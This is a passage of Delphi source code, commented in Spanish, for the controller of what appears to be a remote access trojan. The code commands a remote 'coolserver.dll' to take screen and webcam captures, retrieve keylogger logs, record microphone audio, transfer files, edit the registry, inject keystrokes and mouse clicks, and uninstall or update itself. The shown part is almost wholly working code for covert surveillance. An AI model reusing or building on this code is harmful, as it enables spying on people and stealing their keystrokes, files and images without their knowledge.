  MousePos: TPoint; var Handled: Boolean);
begin
  //Se ha seleccionado un item
  if ListViewRegistro.Selected <> nil then
    begin
      //Habilitamos las opciones para trabajar con claves
      PopupRegistro.Items[1].Enabled := True;
      PopupRegistro.Items[2].Enabled := True;
      PopupRegistro.Items[3].Enabled := True;
    end
  else
    begin
      //No se ha seleccionado un item, solo mostramos el menu Nuevo
      PopupRegistro.Items[1].Enabled := False;
      PopupRegistro.Items[2].Enabled := False;
      PopupRegistro.Items[3].Enabled := False;
    end;
end;

procedure TFormControl.Clave1Click(Sender: TObject);
var
  NewClave: string;
begin
  if Servidor.Connection.Connected then
    begin
      NewClave := InputBox(_('Escriba el nombre para la nueva clave.'),
        _('Crear nueva clave'), _('NuevaClave'));
      if NewClave <> '' then
        Servidor.Connection.Writeln('NEWCLAVE|' + EditPathRegistro.Text + '|' + NewClave);
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnEnviarMensajeClick(Sender: TObject);
var
  Tipo: string;
begin
  if Servidor.Connection.Connected then
    begin
      if RdGrpBotonesMensaje.ItemIndex <> -1 then
        begin
          if RdBtnError.Checked then
            Tipo := 'WARN'
          else if RdBtnPregunta.Checked then
            Tipo := 'QUES'
          else if RdBtnExclamacion.Checked then
            Tipo := 'EXCL'
          else if RdBtnInfo.Checked then
            Tipo := 'INFO'
          else if RdBtnVacio.Checked then
            Tipo := 'VACI';
          Servidor.Connection.Writeln('MSJN' + MemoMensaje.Text + '|' +
            EditTituloMensaje.Text + '|' + Tipo + '|' +
            PChar(IntToStr(RdGrpBotonesMensaje.ItemIndex)) + '|');
        end
      else
        MessageDlg(_('Selecciona alg�n tipo de bot�n'), mtWarning, [mbOK], 0);
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.TrackBarCalidadChange(Sender: TObject);
begin
  LabelPosicionCompresJpg.Caption := IntToStr(TrackBarCalidad.Position) + '%';
end;

procedure TFormControl.BtnCapturarScreen1Click(Sender: TObject);
begin
  if not BtnCapturarScreen.Enabled then Exit;
  if not Servidor.Connection.Connected then
    begin
      MessageDlg('No est�s conectado!', mtWarning, [mbOK], 0);
      Exit;
    end;

  BtnCapturarScreen.Enabled := False;
  if TimerCaptureScreen.Enabled then
    TimerCaptureScreen.Enabled := not TimerCaptureScreen.Enabled; //Desactivamos el timer, ser� activado cuando recibamos la captura
  if FormVisorCaptura = nil then
    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr(imgCaptura.Height) + '|')
  else
    Servidor.Connection.Writeln('CAPSCREEN|' + IntToStr(TrackBarCalidad.Position) + '|' + IntToStr((FormVisorCaptura as TScreenMax).imgcaptura.Height) + '|');
end;

procedure TFormControl.Enviarteclas1Click(Sender: TObject);
//Enviar teclas a una ventana....
var
  NewSendKeys: TFormSendKeys;
begin
  if Servidor.Connection.Connected then
    begin
      if ListViewVentanas.Selected = nil then
        begin
          MessageDlg(_('Selecciona alguna ventana para enviarle teclas.'),
            mtWarning, [mbOK], 0);
        end
      else
        begin
          NewSendKeys := TFormSendKeys.Create(Self, Servidor,
            ListViewVentanas.Selected.SubItems[0], ListViewVentanas.Selected.Caption);
          NewSendKeys.Show;
        end;
    end
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.TrackBarCalidadWebcamChange(Sender: TObject);
begin
  LabelPosicionCompresJpgWebcam.Caption :=
    IntToStr(TrackBarCalidadWebcam.Position) + ' %';
end;

procedure TFormControl.BtnObtenerWebcamsClick(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  Servidor.Connection.Writeln('LISTARWEBCAMS');
end;

procedure TFormControl.BtnCapturarWebcamClick(Sender: TObject);
begin
  if not BtnCapturarWebcam.Enabled then Exit;

  if not Servidor.Connection.Connected then
    begin
      MessageDlg('No est�s conectado!', mtWarning, [mbOK], 0);
      Exit;
    end;

  if (ComboBoxWebcam.Items.Count = 0) or (ComboBoxWebcam.Items.Text = '') then Exit;
  BtnCapturarWebcam.Enabled := False;
  if TimerCamCapture.Enabled then
    TimerCamCapture.Enabled := not TimerCamCapture.Enabled; //Desactivamos el timer, ser� activado cuando recibamos la captura
  Servidor.Connection.Writeln('CAPTURAWEBCAM|' + IntToStr(ComboboxWebcam.ItemIndex) +
    '|' + IntToStr(TrackBarCalidadWebcam.Position));
end;

procedure TFormControl.EnviarClickM(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  AltoCap, AnchoCap: Integer;
begin

  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if CheckBoxMouseClicks.Checked then
    begin
      if (anchurapantalla = 0) then //Necesitamos el tama�o de la pantalla para calcular la posicion real.
        begin
          MessageDlg(_('Pide una captura primero!'), mtWarning, [mbOK], 0);
          Exit;
        end;
      AnchoCap := AnchuraPantalla;
      AltoCap := AlturaPantalla;
      X := (X * AnchoCap) div (imgCaptura.Width); //Una regla de tres
      Y := (Y * AltoCap) div (imgCaptura.Height);
      if button = mbLeft then
        begin
          //Se�alar
          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKIZQ' + '|');
          //Hacer Click
          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKIZQ' + '|');
        end
      else if button = mbRight then
        begin
          //Se�alar
          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKDER' + '|');
          //Hacer Click
          Servidor.Connection.Writeln('MOUSEP' + IntToStr(X) + '|' + IntToStr(y) + '|' + 'CLICKDER' + '|');
        end;
    end;
end;

procedure TFormControl.BtnActualizarServidorInfoClick(Sender: TObject);
begin
  if not BtnActualizarServidorInfo.Enabled then Exit;
  BtnActualizarServidorInfo.Enabled := False;
  if Servidor.connection.Connected then
    Servidor.connection.writeln('SERVIDOR|INFO|')
  else
    MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
end;

procedure TFormControl.BtnEnviarComandoServidorClick(Sender: TObject);
begin

  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if ComboBoxGestionDeServidor.Text = {_}('Cerrar') then
    begin
      if MessageBoxW(Handle,
        Pwidechar(_('�Est� seguro de que desea cerrar el servidor? Este no se volver� a iniciar si no est�n activos los m�todos de auto-inicio.')),
        pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) = idYes then
        Servidor.Connection.Writeln('SERVIDOR|CERRAR|');
    end;
  if ComboBoxGestionDeServidor.Text = {_}('Desinstalar') then
    begin
      if MessageBoxW(Handle,
        Pwidechar(_('�Est� seguro de que desea desinstalar el servidor? �Este ser� removido completamente del equipo!')),
        Pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) = idYes then
        Servidor.Connection.Writeln('SERVIDOR|DESINSTALAR|');
    end;
  if ComboBoxGestionDeServidor.Text = {_}('Actualizar') then
    begin
      if MessageBoxW(Handle,
        Pwidechar(_('�Est� seguro de que desea actualizar el servidor? �Se volver� a enviar coolserver.dll!')),
        Pwidechar(_('Confirmaci�n')), Mb_YesNo + MB_IconAsterisk) = idYes then
        Servidor.Connection.Writeln('SERVIDOR|ACTUALIZAR|');
    end;
end;

procedure TFormControl.BtnVerGrandeCapClick(Sender: TObject);
begin
  if FormVisorCaptura = nil then
    FormVisorCaptura := TScreenMax.Create(Self, ImgCaptura.Picture, Servidor, TObject(Self));
  (FormVisorCaptura as TScreenMax).show;
end;

procedure TFormControl.TimerCaptureScreenTimer(Sender: TObject);
begin
  if not Servidor.Connection.Connected then
    begin
      Self.TimerCaptureScreen.Enabled := False;
      Exit;
    end;
  BtnCapturarScreen.Click;
end;

//El popup de Descargar fichero a�ade el archivo al ListView de descargas, lo encola

procedure TFormControl.Descargarfichero1Click(Sender: TObject);
var
  FilePath: AnsiString;
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;
  if PageControlArchivos.ActivePage = TabSheetVerArchivos then
    mslistviewitem := ListViewArchivos.Selected
  else
    mslistviewitem := ListViewBuscar.Selected;

  while Assigned(mslistviewitem) do
    begin
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        FilePath := Trim(EditPathArchivos.Text) + mslistviewitem.Caption
      else
        FilePath := Trim(mslistviewitem.subitems[0]);

      if (mslistviewitem.ImageIndex = 3) then
        begin
          PageControlArchivos.ActivePage := TabSheetTransferencias;
          Servidor.Connection.Writeln('GETFOLDER|' + FilePath + '\');
        end
      else
        agregardescarga(FilePath);
      if PageControlArchivos.ActivePage = TabSheetVerArchivos then
        mslistviewitem := ListViewArchivos.GetNextItem(mslistviewitem, sdAll, [isSelected])
      else
        mslistviewitem := ListViewBuscar.GetNextItem(mslistviewitem, sdAll, [isSelected])
    end;

end;

//El popup de Subir fichero a�ade el archivo al ListView de descargas, lo encola

procedure TFormControl.Subirfichero1Click(Sender: TObject);
var
  i: Integer;
  Descarga: TDescargaHandler;
  FilePath: AnsiString;
begin
  if not Servidor.Connection.Connected then
    begin
      MessageDlg(_('No est�s conectado!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if EditPathArchivos.Text = '' then
    begin
      MessageDlg(_('Entra al directorio primero!'), mtWarning, [mbOK], 0);
      Exit;
    end;

  if OpenDialogUpload.Execute then
    begin
      //nos aseguramos de que el archivo no este en la lista de
      //descargas (sin importar si esta transfiriendo o si ya finalizo)
      FilePath := OpenDialogUpload.FileName;
      FilePath := EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName);
      for i := 0 to ListViewDescargas.Items.Count - 1 do
        begin
          Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
          if Descarga.Origen = FilePath then
            begin
              MessageDlg(('El achivo ya se encuentra en la lista de descargas'),
                mtWarning, [mbOK], 0);
              Exit;
            end;
        end;
      Servidor.Connection.Writeln('SENDFILE|' + OpenDialogUpload.FileName +
        '|' + EditPathArchivos.Text + ExtractFileName(OpenDialogUpload.FileName) +
        '|' + MD5(OpenDialogUpload.FileName) +
        '|' + IntToStr(MyGetFileSize(OpenDialogUpload.FileName)));
    end;
end;

procedure TFormControl.OnReadFile(AThread: TIdPeerThread);
var
  Buffer: string;
  Descarga: TDescargaHandler;
  FilePath: AnsiString;
  Size: Int64;
  i: Integer;
  MS, MS2: TMemoryStream;
  JPG: TJPEGImage;
  tmpstr, tempstr1, tempstr2, tempstr3: string;
  Item: Tlistitem;
  p: Pointer;
  Bufferr: array[0..4095 {4kb}] of Byte;
begin
  Buffer := Trim(Athread.Connection.ReadLn);

  if Copy(PChar(Buffer), 1, 7) = 'GETFILE' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
      Delete(Buffer, 1, Pos('|', Buffer));
      Size := StrToInt(Trim(Buffer));
      CrearDirectoriosUsuario();
      Descarga := TDescargaHandler.Create(Athread, FilePath, Size,
        DirDescargas + ExtractFileName(FilePath), ListViewDescargas, True);
      Descarga.callback := Self.TransferFinishedNotification;
      Descarga.transferFile;
    end
  else if Copy(PChar(Buffer), 1, 14) = 'RESUMETRANSFER' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
      Delete(Buffer, 1, Pos('|', Buffer));
      Size := StrToInt(Buffer);
      for i := 0 to ListViewDescargas.Items.Count - 1 do
        begin
          Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
          if Descarga.Origen = FilePath then
            begin
              Descarga.AThread := Athread; //El socket anterior ya esta desconectado
              Descarga.SizeFile := Size;
              Descarga.ResumeTransfer;
              Exit;
            end;
        end;
    end
  else if Copy(PChar(Buffer), 1, 8) = 'SENDFILE' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      tmpstr := Copy(Buffer, 1, Pos('|', Buffer) - 1); //HASH
      Delete(Buffer, 1, Pos('|', Buffer));
      FilePath := Trim(Buffer);

      if MD5(FilePath) <> Tmpstr then
        begin
          MessageDlg(_('Intento de intrusi�n a archivo bloqueado: ') + FilePath, mtWarning, [mbOK], 0);
        end
      else
        begin
          Size := MyGetFileSize(FilePath);
          Descarga := TDescargaHandler.Create(Athread, FilePath, Size, '',
            ListViewDescargas, False);
          Descarga.UploadFile;
        end;
    end
  else if Copy(PChar(Buffer), 1, 14) = 'CAPSCREENSTART' then
    begin
      //Se dispone a empezar a mandar la captura, prepararamos el
      //memory stream y el tama�o del buffer que tenemos que recibir
      Delete(Buffer, 1, Pos('|', Buffer));
      //La anchura y altura de su pantalla
      FilePath := Copy(Buffer, 1, Pos('|', Buffer) - 1);
      AnchuraPantalla := StrToInt(Copy(FilePath, 1, Pos('�', FilePath) - 1));
      Delete(FilePath, 1, Pos('�', FilePath));
      AlturaPantalla := StrToInt(FilePath);
      Delete(Buffer, 1, Pos('|', Buffer));
      //0=CapScreen
      CapSize[0] := StrToInt(Trim(Buffer)); //El tama�o de la captura
      MSC[0] := TMemoryStream.Create;
      MSC[0].Position := 0;
      ProgressBarScreen.Position := 0; //Ponemos a 0 la barra de progreso
      if FormVisorCaptura <> nil then (FormVisorCaptura as TScreenMax).Progressbar.Position := ProgressBarScreen.Position;
    end
  else if Copy(PChar(Buffer), 1, 14) = 'CAPSCREENCHUNK' then
    begin
      //Estamos recibiendo un fragmento de la captura
      Delete(Buffer, 1, Pos('|', Buffer));
      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tama�o del chunk!
      Delete(Buffer, 1, Pos('|', Buffer));
      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
      //0=CapScreen
      MSC[0].Write(Bufferr, Size); //Escribimos el bloque
      ProgressBarScreen.Position := Round((MSC[0].Size * 100) / CapSize[0]); //Actualizamos la barra de progreso
      if FormVisorCaptura <> nil then (FormVisorCaptura as TScreenMax).Progressbar.Position := ProgressBarScreen.Position;
      if CapSize[0] = MSC[0].Size then //Hemos terminado :D
        begin
          ProgressBarScreen.Position := 0; //Ponemos a 0 la barra de progreso
          if FormVisorCaptura <> nil then (FormVisorCaptura as TScreenMax).Progressbar.Position := ProgressBarScreen.Position;
          MSC[0].Position := 0;
          JPG := TJPEGImage.Create;
          JPG.LoadFromStream(MSC[0]);
          if FormVisorCaptura <> nil then
            begin
              try
                (FormVisorCaptura as TScreenMax).ImgCaptura.Width := JPG.Width;
              except
              end;
              (FormVisorCaptura as TScreenMax).ImgCaptura.Picture.Assign(JPG)
            end
          else
            begin
              imgCaptura.Width := JPG.Width; //Establecemos ancho
              imgCaptura.Height := JPG.Height; //Establecemos alto
              imgcaptura.Picture.Assign(JPG);
            end;
          LabelTamano.Caption := IntToStr(MSC[0].Size div 1024); //Es interesante saber el tama�o
          if (PrefijoGuardarCaptura <> '') then
            begin
              InumeroCaptura := InumeroCaptura + 1;
              CrearDirectoriosUsuario();
              while FileExists(DirCapturas + PrefijoGuardarCaptura + IntToStr(InumeroCaptura) + '.jpg') do
                PrefijoGuardarCaptura := PrefijoGuardarCaptura + '_';
              MSC[0].SaveToFile(DirCapturas + PrefijoGuardarCaptura + IntToStr(InumeroCaptura) + '.jpg');
            end;
          MSC[0].Free;
          JPG.Free;
          RecibiendoJPG := False;
          BtnCapturarScreen.Enabled := True;
          TimerCaptureScreen.Enabled := CheckBoxAutoCapturaScreen.Checked; //Volvemos a activar
        end;
    end
  else if Copy(PChar(Buffer), 1, 18) = 'CAPTURAWEBCAMSTART' then
    begin
      //Se dispone a empezar a mandar la captura, prepararamos el
      //memory stream y el tama�o del buffer que tenemos que recibir
      Delete(Buffer, 1, Pos('|', Buffer));
      //1=CapWebcam
      CapSize[1] := StrToInt(Trim(Buffer)); //El tama�o de la captura
      MSC[1] := TMemoryStream.Create;
      MSC[1].Position := 0;
      ProgressBarWebCam.Position := 0; //Ponemos a 0 la barra de progreso
    end
  else if Copy(PChar(Buffer), 1, 11) = 'WEBCAMCHUNK' then
    begin
      //Estamos recibiendo un fragmento de la captura
      Delete(Buffer, 1, Pos('|', Buffer));
      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tama�o del chunk!
      Delete(Buffer, 1, Pos('|', Buffer));
      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
      //1=CapWebcam
      MSC[1].Write(Bufferr, Size); //Escribimos el bloque
      ProgressBarWebCam.Position := Round((MSC[1].Size * 100) / CapSize[1]); //Actualizamos la barra de progreso
      if CapSize[1] = MSC[1].Size then //Hemos terminado :D
        begin
          ProgressBarWebCam.Position := 0; //Ponemos a 0 la barra de progreso
          MSC[1].Position := 0;
          JPG := TJPEGImage.Create;
          JPG.LoadFromStream(MSC[1]);
          imgWebcam.Width := JPG.Width; //Establecemos ancho
          imgWebcam.Height := JPG.Height; //Establecemos alto
          imgWebcam.Picture.Assign(JPG);
          LabelTamaniowebcam.Caption := IntToStr(MSC[1].Size div 1024); //Es interesante saber el tama�o
          if (PrefijoGuardarWebcam <> '') then
            begin
              InumeroWebcam := InumeroWebcam + 1;
              CrearDirectoriosUsuario();
              while FileExists(DirWebcam + PrefijoGuardarWebcam + IntToStr(InumeroWebcam) + '.jpg') do
                PrefijoGuardarWebcam := PrefijoGuardarWebcam + '_';
              MSC[1].SaveToFile(DirWebcam + PrefijoGuardarWebcam + IntToStr(InumeroWebcam) + '.jpg');
            end;
          MSC[1].Free;
          JPG.Free;
          BtnCapturarWebcam.Enabled := True;
          TimerCamCapture.Enabled := CheckBoxAutoCamCapture.Checked; //Volvemos a activar
        end;
    end
  else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILSTART' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      CapSize[2] := StrToInt(Trim(Buffer)); //Tama�o del Thumbnail

      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := 0;
      MSC[2] := TMemoryStream.Create;
      MSC[2].Position := 0;

    end
  else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILERROR' then
    begin
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := 0;
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).statusbar.panels[3].Text := 'ERROR';
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
    end
  else if Copy(PChar(Buffer), 1, 14) = 'THUMBNAILCHUNK' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tama�o del chunk!
      Delete(Buffer, 1, Pos('|', Buffer));

      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
      MSC[2].Write(Bufferr, Size); //Escribimos el bloque

      //Actualizamos la barra de progreso
      (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := Round((MSC[2].Size * 100) / CapSize[2]);

      if CapSize[2] = MSC[2].Size then //Hemos terminado :D
        begin
          (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).ProgressBarThumbnail.Position := 0;
          MSC[2].Position := 0;
          JPG := TJPEGImage.Create;
          JPG.LoadFromStream(MSC[2]);
          (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).imageThumnail.picture.Assign(JPG);
          JPG.Free;
          MSC[2].Free;
          (FormVisorDeMiniaturas as TFormVisorDeMiniaturas).callback();
        end;
    end
  else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGSTART' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      CapSize[4] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tama�o del Log
      ProgressBarKeylogger.Position := 0;
      MSC[4] := TMemoryStream.Create;
      MSC[4].Position := 0;
    end
  else if Copy(PChar(Buffer), 1, 17) = 'KEYLOGGERLOGCHUNK' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tama�o del chunk!
      Delete(Buffer, 1, Pos('|', Buffer));

      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
      MSC[4].Write(Bufferr, Size); //Escribimos el bloque

      ProgressBarKeylogger.Position := Round((MSC[4].Size * 100) / CapSize[4]);

      if MSC[4].Size = Capsize[4] then //Finish!
        begin
          ProgressBarKeylogger.Position := 0;
          MSC[4].Position := 0;
          CreardirectoriosUsuario();
          while fileexists(DirUsuario + 'Klog' + IntToStr(i) + '.txt') do
            i := i + 1;
          MSC[4].savetofile(DirUsuario + 'Klog' + IntToStr(i) + '.txt');
          MSC[4].Position := 0;
          RichEditKeylogger.Lines.Clear;
          Setlength(tmpstr, MSC[4].Size);
          MSC[4].read(tmpstr[1], MSC[4].Size);
          AgregarARichEdit(tmpstr);
          tmpstr := '';
          MSC[4].Free;
          MSC[4] := nil;
          SpeedButtonRecibirLog.Enabled := True;
        end;
    end
  else if Copy(PChar(Buffer), 1, 10) = 'AUDIOSTART' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      CapSize[3] := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tama�o del Log
      ProgressBarAudio.Position := 0;
      MSC[3] := TMemoryStream.Create;
      MSC[3].Position := 0;

    end
  else if Copy(PChar(Buffer), 1, 10) = 'AUDIOCHUNK' then
    begin
      Delete(Buffer, 1, Pos('|', Buffer));
      Size := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1)); //Tama�o del chunk!
      Delete(Buffer, 1, Pos('|', Buffer));

      Athread.Connection.ReadBuffer(bufferr, Size); //Recibimos el bloque
      MSC[3].Write(Bufferr, Size); //Escribimos el bloque
      ProgressBarAudio.Position := Round((MSC[3].Size * 100) / CapSize[3]);

      if CapSize[3] = MSC[3].Size then //Recibido!
        begin
          MSC[3].Position := 0;
          ProgressBarAudio.Position := 0;
          if (MSC[3].Size > 10) then //No ha habido error :D
            begin
              item := listviewAudio.Items.Add();
              NumeroAudio := NumeroAudio + 1;
              item.Caption := IntToStr(NumeroAudio);
              item.subitems.Add(IntToStr(MSC[3].Size));
              {hz canal bits}
              TmpStr := UltimoFormato;
              TempStr1 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //HZ
              Delete(TmpStr, 1, Pos('-', TmpStr));
              TempStr2 := Copy(TmpStr, 1, Pos('-', TmpStr) - 1); //Canal
              Delete(TmpStr, 1, Pos('-', TmpStr));
              TempStr3 := TmpStr; //Bits
              item.subitems.Add(IntToStr(StrToInt(tempstr1) * StrToInt(Tempstr2) * StrToInt(Tempstr3) div 8));
              item.subitems.Add(FormatDateTime('hh:mm:ss', now));

              Item.Subitems.Add(UltimoFormato);
              //Creamos el archivo .wav
              MS2 := TMemoryStream.Create;
              MS2.Position := 0;
              MSC[3].Position := 0;
              setlength(buffer, MSC[3].Size);
              MSC[3].read(buffer[1], MSC[3].Size);
              InitWavFile(MS2, StrToInt(TempStr2), StrToInt(TempStr1), StrToInt(TempStr3), buffer);
              setlength(buffer, ms2.Size);
              ms2.read(buffer[1], ms2.Size);

              Getmem(p, MS2.Size);
              MoveMemory(p, MS2.memory, MS2.Size);
              item.data := p; //Guardamos un puntero al sonido
              item.subitems.Add(IntToStr(MS2.Size)); //Necesitaremos el tama�o de el puntero ;)

              if CheckBoxAutoReproducir.Checked then
                sndPlaySound(item.data, SND_MEMORY or SND_ASYNC); //Reproducimos si as� se nos ordena
            end

          else
            begin
              Estado(_('Error al capturar audio')); //Error al capturar audio
            end;

          MSC[3].Free;
          MSC[3] := nil;
          MS2.Free;
          SpeedButtonCapAudio.Enabled := True;
          if CheckBoxCapturarAudioAutomaticamente.Checked then
            SpeedButtonCapAudioClick(nil);
        end;
    end;

end;

//se llama cada vez que finaliza una descarga para que se inicie
//alguna otra descarga que haya sido puesta en cola

procedure TFormControl.TransferFinishedNotification(Sender: TObject; FileName: string);
var
  Descarga: TDescargaHandler;
  i: Integer;
begin

  if (AnsiLowerCase(extractfilename(FileName)) = 'thumbs.db') then
    begin
      CargarThumbsFileAlListview(DirDescargas + 'thumbs.db'); //cargamos las miniaturas
      Receivingthumbfile := False;
    end
  else
    begin

      Estado(_('Transferencia finalizada: ') + extractfilename(FileName));
    end;
  if not Servidor.Terminated and Servidor.Connection.Connected then
    begin
      for i := 0 to ListViewDescargas.Items.Count - 1 do
        begin
          Descarga := TDescargaHandler(ListViewDescargas.Items[i].Data);
          if not Descarga.Transfering and not Descarga.cancelado and not
            Descarga.Finalizado and Descarga.es_descarga then //en espera
            begin
              Servidor.Connection.Writeln('RESUMETRANSFER|' + Descarga.Origen +
                '|' + IntToStr(Descarga.Descargado));
              Exit;
            end;
        end;
    end;
end;

procedure TFormControl.ListViewDescargasContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  Descarga: TDescargaHandler;
begin
  if ListViewDescargas.Selected <> nil then
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Selected.Data);
      if Descarga.Transfering then
        begin
          PopupDescargas.Items[0].Enabled := True;
          PopupDescargas.Items[1].Enabled := False;
          PopupDescargas.Items[2].Enabled := False;
          PopupDescargas.Items[3].Enabled := False;
          PopupDescargas.Items[4].Enabled := False;
          PopupDescargas.Items[5].Enabled := False;
          PopupDescargas.Items[7].Enabled := False;
          //Alg�n d�a conseguiremos que se pueda cancelar una descarga o subida
        end
      else if (not Descarga.Transfering) {AND (not Descarga.cancelado)} and
      (not Descarga.Finalizado) then //en espera o cancelado
        begin
          PopupDescargas.Items[0].Enabled := False;
          PopupDescargas.Items[1].Enabled := True;
          PopupDescargas.Items[2].Enabled := True;
          PopupDescargas.Items[3].Enabled := True;
          PopupDescargas.Items[4].Enabled := True;
          PopupDescargas.Items[5].Enabled := True;
          PopupDescargas.Items[7].Enabled := True;
        end
      else if Descarga.Finalizado then
        begin
          PopupDescargas.Items[0].Enabled := False;
          PopupDescargas.Items[1].Enabled := False;
          PopupDescargas.Items[2].Enabled := True;
          PopupDescargas.Items[3].Enabled := True;
          PopupDescargas.Items[4].Enabled := True;
          PopupDescargas.Items[5].Enabled := True;
          PopupDescargas.Items[7].Enabled := True;
        end;
    end;
  if (ListViewDescargas.Selected = nil) then
    begin
      PopupDescargas.Items[0].Enabled := False;
      PopupDescargas.Items[1].Enabled := False;
      PopupDescargas.Items[2].Enabled := False;
      PopupDescargas.Items[3].Enabled := False;
      PopupDescargas.Items[4].Enabled := False;
      PopupDescargas.Items[5].Enabled := False;
      PopupDescargas.Items[7].Enabled := False;
    end;

  //las subidas de archivo no se reanudan
  if not Descarga.es_descarga then
    PopupDescargas.Items[1].Enabled := False;

end;

//Popup eliminar descarga

procedure TFormControl.Eliminardescarga1Click(Sender: TObject);
var
  Descarga: TDescargaHandler;
  i, j: Integer;
  TmpItem: Tlistitem;
begin
  mslistviewitem := ListViewDescargas.Selected;

  while Assigned(mslistviewitem) do
    begin
      if mslistviewitem.Data <> nil then
        begin
          if not TDescargaHandler(mslistviewitem.Data).Transfering then
            begin
              TDescargaHandler(mslistviewitem.Data).Free;
              i := mslistviewitem.Index;
              tmpitem := mslistviewitem;
              mslistviewitem := ListViewDescargas.GetNextItem(mslistviewitem, sdAll, [isSelected]);
              tmpitem.Delete;
            end;
        end;
    end;
end;

//Popup borrar completados

procedure TFormControl.Borrarcompletados1Click(Sender: TObject);
var
  i, j: Integer;
  Descarga: TDescargaHandler;
begin
  {Lo recorremos en orden inverso sino al borrar el primer item, el resto se desplazaria hacia arriba y nos saldriamos del bucle}
  for i := ListViewDescargas.Items.Count - 1 downto 0 do
    begin
      Descarga := TDescargaHandler(ListViewDescargas.Items.Item[i].Data);
      if Descarga.Finalizado then
        begin //Borrar el item descargado y subir todos hacia arriba
          // Descarga.ProgressBar.Free;
          ListViewDescargas.Items[i].Delete;
          Descarga.Free;
          //Mover los progressbar que halla por debajo hacia arriba
          for j := i to ListViewDescargas.Items.Count - 1 do
            //Si hay una progressbar subirla un puesto
            if ListViewDescargas.Items.Item[j].Data <> nil then
              begin
                Descarga := TDescargaHandler(ListViewDescargas.Items.Item[j].Data);
                { Descarga.ProgressBar.Top :=
                   Descarga.ProgressBar.Top - (Descarga.ProgressBar.BoundsRect.Bottom -
                   Descarga.ProgressBar.BoundsRect.Top); }
              end;
        end;
    end;
end;

//Subir al primer puesto

procedure TFormControl.Subiralprimerpuesto1Click(Sender: TObject);
var
  Item: TListItem;
  i, j: Integer;
begin
  for i := 0 to ListViewDescargas.Items.Count - 1 do
    if ListViewDescargas.Items.Item[i].SubItems[0] = _('En espera') then
      begin
        if ListViewDescargas.ItemIndex = i then
          Exit; //Es el primer item en espera no se puede subir m�s
        Item := TListItem.Create(ListViewDescargas.Items);
        Item.Assign(ListViewDescargas.Selected);
        for j := ListViewDescargas.Selected.Index downto i + 1 do
          ListViewDescargas.Items.Item[j] := ListViewDescargas.Items.Item[j - 1];
        ListViewDescargas.Items.Item[i] := Item;
        ListViewDescargas.ItemIndex := i;
        Item.Free;
        break;
      end;
end;

//Subir un puesto

procedure TFormControl.Subir1Click(Sender: TObject);
var
  Item: TListItem;
  i: Integer;
begin
  if ListViewDescargas.ItemIndex = 0 then
    Exit; //Si es el primero...
  //Si su item superior est� tambien en espera se intercambia con �l
  i := ListViewDescargas.ItemIndex;
